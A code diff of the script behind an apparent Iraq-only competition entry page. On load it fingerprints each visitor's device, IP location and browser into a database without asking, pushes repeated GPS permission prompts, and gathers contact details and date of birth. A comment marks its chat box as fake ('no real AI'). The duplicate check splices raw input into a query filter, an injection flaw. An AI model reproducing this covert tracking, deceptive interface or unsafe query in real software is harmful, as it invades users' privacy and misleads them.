-         lng>=IRAQ.lngMin && lng<=IRAQ.lngMax;
+function alert_(elId, type, msg) {
+  const el = document.getElementById(elId);
+  if (!el) return;
+  el.innerHTML = msg ? `<div class="alert alert-${type}">${msg}</div>` : '';
 }
 
-// GPS UPDATE (UNCHANGED STRUCTURE)
-async function updateGPS(status,lat,lng,acc){
-  if(!visitorId)return;
-  const eligible=status==='granted' && isIraq(lat,lng);
-  await sb.from('visitors').update({
-    gps_status:status,
-    gps_lat:lat||null,
-    gps_lng:lng||null,
-    gps_accuracy:acc||null,
-    is_eligible:eligible
-  }).eq('id',visitorId);
+function sessionId() {
+  let s = sessionStorage.getItem('_cid');
+  if (!s) { s = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2,8); sessionStorage.setItem('_cid', s); }
+  return s;
 }
 
-// GPS
-async function requestGPS(){
-  const btn=document.getElementById('btn-gps');
-  btn.disabled=true;
+function fingerprint() {
+  const raw = [navigator.userAgent, navigator.language, screen.width+'x'+screen.height,
+    screen.colorDepth, new Date().getTimezoneOffset(),
+    navigator.hardwareConcurrency||0, navigator.deviceMemory||0].join('|');
+  let h = 5381;
+  for (let i = 0; i < raw.length; i++) h = ((h<<5)+h)^raw.charCodeAt(i), h>>>=0;
+  return h.toString(16).padStart(8,'0');
+}
+
+function parseUA(ua) {
+  let browser='Unknown', bv='', os='Unknown', ov='', dt='desktop', brand='';
+  if (/Edg\//.test(ua))       { browser='Edge';    bv=ua.match(/Edg\/(\d+)/)?.[1]||''; }
+  else if (/OPR\//.test(ua))  { browser='Opera';   bv=ua.match(/OPR\/(\d+)/)?.[1]||''; }
+  else if (/Chrome\//.test(ua)){ browser='Chrome';  bv=ua.match(/Chrome\/(\d+)/)?.[1]||''; }
+  else if (/Firefox\//.test(ua)){ browser='Firefox'; bv=ua.match(/Firefox\/(\d+)/)?.[1]||''; }
+  else if (/Safari\//.test(ua)){ browser='Safari';  bv=ua.match(/Version\/(\d+)/)?.[1]||''; }
+
+  if (/Windows NT 10/.test(ua))        { os='Windows'; ov='10/11'; }
+  else if (/Windows/.test(ua))         { os='Windows'; }
+  else if (/iPhone/.test(ua))          { os='iOS';     ov=ua.match(/iPhone OS ([\d_]+)/)?.[1]?.replace(/_/g,'.')||''; }
+  else if (/iPad/.test(ua))            { os='iPadOS'; }
+  else if (/Android/.test(ua))         { os='Android'; ov=ua.match(/Android ([\d.]+)/)?.[1]||''; }
+  else if (/Mac OS X/.test(ua))        { os='macOS';   ov=ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g,'.')||''; }
+  else if (/Linux/.test(ua))           { os='Linux'; }
+
+  if (/iPhone|Android.*Mobile|Windows Phone/.test(ua)) dt='mobile';
+  else if (/iPad|Android(?!.*Mobile)/.test(ua))        dt='tablet';
+
+  if (/iPhone|iPad/.test(ua)) brand='Apple';
+  else if (/Samsung/.test(ua)) brand='Samsung';
+  else if (/Huawei/.test(ua))  brand='Huawei';
+  else if (/Xiaomi|MIUI/.test(ua)) brand='Xiaomi';
+  else if (/Oppo/.test(ua))    brand='Oppo';
+
+  return { browser, bv, os, ov, dt, brand };
+}
+
+function isIraq(lat, lng) {
+  return lat >= IRAQ.latMin && lat <= IRAQ.latMax && lng >= IRAQ.lngMin && lng <= IRAQ.lngMax;
+}
+
+// ══════════════════════════════════════════════════
+//  VISITOR TRACKING  ← unchanged
+// ══════════════════════════════════════════════════
+async function trackVisitor() {
+  try {
+    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+    ipData = await r.json();
+  } catch { ipData = {}; }
+
+  const ua = navigator.userAgent;
+  const { browser, bv, os, ov, dt, brand } = parseUA(ua);
+
+  const row = {
+    session_id:      sessionId(),
+    fingerprint:     fingerprint(),
+    ip_address:      ipData.ip       || null,
+    ip_country:      ipData.country_name || null,
+    ip_country_code: ipData.country_code || null,
+    ip_region:       ipData.region   || null,
+    ip_city:         ipData.city     || null,
+    ip_isp:          ipData.org      || null,
+    ip_lat:          ipData.latitude || null,
+    ip_lng:          ipData.longitude|| null,
+    ip_timezone:     ipData.timezone || null,
+    user_agent:      ua,
+    browser:         browser,
+    browser_version: bv,
+    os:              os,
+    os_version:      ov,
+    device_type:     dt,
+    device_brand:    brand,
+    screen_width:    screen.width,
+    screen_height:   screen.height,
+    language:        navigator.language,
+    languages:       navigator.languages?.join(', ') || null,
+    timezone:        Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cpu_cores:       navigator.hardwareConcurrency || null,
+    device_memory:   navigator.deviceMemory ? navigator.deviceMemory + 'GB' : null,
+    platform:        navigator.platform || null,
+    touch_points:    navigator.maxTouchPoints || 0,
+    referrer:        document.referrer || null,
+    gps_status:      'pending',
+    is_eligible:     false,
+  };
+
+  try {
+    const { data } = await sb.from('visitors').insert(row).select('id').single();
+    if (data) visitorId = data.id;
+  } catch (e) { /* non-fatal */ }
+}
+
+async function updateGPS(status, lat, lng, acc) {
+  if (!visitorId) return;
+  const eligible = status === 'granted' && isIraq(lat, lng);
+  try {
+    await sb.from('visitors').update({
+      gps_status: status,
+      gps_lat: lat ?? null,
+      gps_lng: lng ?? null,
+      gps_accuracy: acc ?? null,
+      is_eligible: eligible,
+      eligibility_reason: eligible ? 'GPS confirmed Iraq'
+        : status === 'denied' ? 'GPS permission denied'
+        : 'GPS location outside Iraq',
+    }).eq('id', visitorId);
+  } catch { /* non-fatal */ }
+}
+
+// ══════════════════════════════════════════════════
+//  GPS FLOW — auto-trigger with 3 retries
+// ══════════════════════════════════════════════════
+let gpsAttempts = 0;
+const GPS_MAX_ATTEMPTS = 3;
+
+function setGpsStatus(state, text, showRetry) {
+  const bar  = document.getElementById('gps-status-bar');
+  const dot  = document.getElementById('gps-status-dot');
+  const txt  = document.getElementById('gps-status-text');
+  const btn  = document.getElementById('gps-retry-btn');
+  bar.style.display = 'flex';
+  dot.className = 'gps-status-dot' + (state ? ' ' + state : '');
+  txt.textContent = text;
+  btn.style.display = showRetry ? 'inline-flex' : 'none';
+}
+
+function requestGps() {
+  if (!navigator.geolocation) {
+    updateGPS('denied', null, null, null);
+    show('blocked');
+    return;
+  }
+
+  gpsAttempts++;
+  setGpsStatus('', 'Verifying your location…', false);
 
   navigator.geolocation.getCurrentPosition(
-    async pos=>{
-      const {latitude:lat,longitude:lng,accuracy:acc}=pos.coords;
-      gpsPosition={lat,lng,acc};
-
-      await updateGPS('granted',lat,lng,acc);
-
-      isIraq(lat,lng)?show('form'):show('blocked');
+    async pos => {
+      const { latitude: lat, longitude: lng, accuracy: acc } = pos.coords;
+      gpsPosition = { lat, lng, acc };
+      setGpsStatus('success', 'Location verified', false);
+      await updateGPS('granted', lat, lng, acc);
+      isIraq(lat, lng) ? show('form') : show('blocked');
     },
-    async ()=>{
-      await updateGPS('denied');
-      document.getElementById('gps-alert').innerHTML=
-        '<div style="color:#ff6b6b">Location denied. Tap again.</div>';
-      btn.disabled=false;
+    async err => {
+      await updateGPS('denied', null, null, null);
+
+      if (gpsAttempts < GPS_MAX_ATTEMPTS) {
+        const remaining = GPS_MAX_ATTEMPTS - gpsAttempts;
+        setGpsStatus('denied',
+          `Location access denied. ${remaining} attempt${remaining > 1 ? 's' : ''} remaining.`,
+          true);
+      } else {
+        // All attempts exhausted
+        setGpsStatus('denied', 'Location access denied.', false);
+        show('blocked');
+      }
     },
-    {enableHighAccuracy:true,timeout:15000,maximumAge:0}
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
 }
 
-document.getElementById('btn-gps').addEventListener('click',requestGPS);
-
-// AUTO + MOBILE FIX
-setTimeout(()=>{requestGPS();},400);
-document.addEventListener('click',function once(){
-  requestGPS();
-  document.removeEventListener('click',once);
-});
-
-// FORM
-async function submitForm(){
-  const btn=document.getElementById('btn-submit');
-
-  const name=document.getElementById('f-name').value.trim();
-  const email=document.getElementById('f-email').value.trim();
-  const phone=document.getElementById('f-phone').value.trim();
-  const dob=document.getElementById('f-dob').value;
-
-  btn.disabled=true;
-
-  const {data}=await sb.from('contestants').insert({
-    full_name:name,
-    email:email,
-    phone:phone,
-    date_of_birth:dob,
-    gps_lat:gpsPosition?.lat
-  }).select('id').single();
-
-  document.getElementById('entry-ref').textContent=
-    'REF: '+data.id.slice(0,8).toUpperCase();
-
-  show('success');
+function retryGps() {
+  requestGps();
 }
 
-// BOOT
-(async()=>{
-  show('gps');
+// Chat input — decorative (no real AI)
+function handleChatInput() {
+  const input = document.getElementById('chat-input');
+  input.value = '';
+}
+
+// ══════════════════════════════════════════════════
+//  FORM SUBMISSION  ← unchanged
+// ══════════════════════════════════════════════════
+async function submitForm() {
+  const btn = document.getElementById('btn-submit');
+
+  ['name','email','phone','dob'].forEach(f => {
+    document.getElementById('e-'+f).textContent = '';
+    document.getElementById('f-'+f).classList.remove('err');
+  });
+  alert_('form-alert','','');
+
+  const name  = document.getElementById('f-name').value.trim();
+  const email = document.getElementById('f-email').value.trim();
+  const phone = document.getElementById('f-phone').value.trim();
+  const dob   = document.getElementById('f-dob').value;
+
+  let ok = true;
+  function fieldErr(f, msg) {
+    document.getElementById('e-'+f).textContent = msg;
+    document.getElementById('f-'+f).classList.add('err');
+    ok = false;
+  }
+
+  if (name.length < 3)
+    fieldErr('name', 'Please enter your full name.');
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
+    fieldErr('email', 'Please enter a valid email address.');
+  if (phone.replace(/\D/g,'').length < 7)
+    fieldErr('phone', 'Please enter a valid phone number.');
+  if (!dob)
+    fieldErr('dob', 'Please enter your date of birth.');
+  else if ((Date.now() - new Date(dob)) / 31557600000 < 18)
+    fieldErr('dob', 'You must be at least 18 years old to enter.');
+
+  if (!ok) return;
+
+  btn.disabled = true;
+  btn.textContent = 'Submitting…';
+
+  try {
+    const { data: dup } = await sb.from('contestants')
+      .select('id').or(`email.eq.${email},phone.eq.${phone}`).limit(1);
+    if (dup?.length) {
+      alert_('form-alert','warn','This email or phone number has already been used to enter. Only one entry per person is allowed.');
+      btn.disabled = false; btn.textContent = 'Enter the Competition';
+      return;
+    }
+  } catch { /* continue */ }
+
+  const { browser, bv, os, ov, dt } = parseUA(navigator.userAgent);
+
+  try {
+    const { data, error } = await sb.from('contestants').insert({
+      visitor_id:     visitorId,
+      full_name:      name,
+      email:          email,
+      phone:          phone,
+      date_of_birth:  dob,
+      ip_address:     ipData.ip         || null,
+      ip_country:     ipData.country_name || null,
+      ip_city:        ipData.city       || null,
+      ip_isp:         ipData.org        || null,
+      gps_lat:        gpsPosition?.lat  || null,
+      gps_lng:        gpsPosition?.lng  || null,
+      device_type:    dt,
+      browser:        browser + (bv ? ' ' + bv : ''),
+      os:             os + (ov ? ' ' + ov : ''),
+      fingerprint:    fingerprint(),
+      is_eligible:    true,
+    }).select('id').single();
+
+    if (error) throw error;
+
+    if (visitorId)
+      await sb.from('visitors').update({ has_registered: true }).eq('id', visitorId);
+
+    document.getElementById('entry-ref').textContent =
+      'REF: ' + (data.id?.slice(0,8).toUpperCase() || 'CONFIRMED');
+    show('success');
+
+  } catch (e) {
+    const msg = e?.code === '23505'
+      ? 'This email or phone number has already been used to enter.'
+      : 'Something went wrong. Please try again.';
+    alert_('form-alert', 'err', msg);
+    btn.disabled = false;
+    btn.textContent = 'Enter the Competition';
+  }
+}
+
+// ══════════════════════════════════════════════════
+//  BOOTSTRAP — auto-trigger GPS after load
+// ══════════════════════════════════════════════════
+(async () => {
+  await trackVisitor();
+  const loader = document.getElementById('screen-loading');
+  loader.style.opacity = '0';
+  setTimeout(() => {
+    loader.style.display = 'none';
+    show('gps');
+    // Auto-fire GPS immediately — triggers native OS permission dialog
+    requestGps();
+  }, 500);
 })();
 </script>
-
 </body>
 </html>
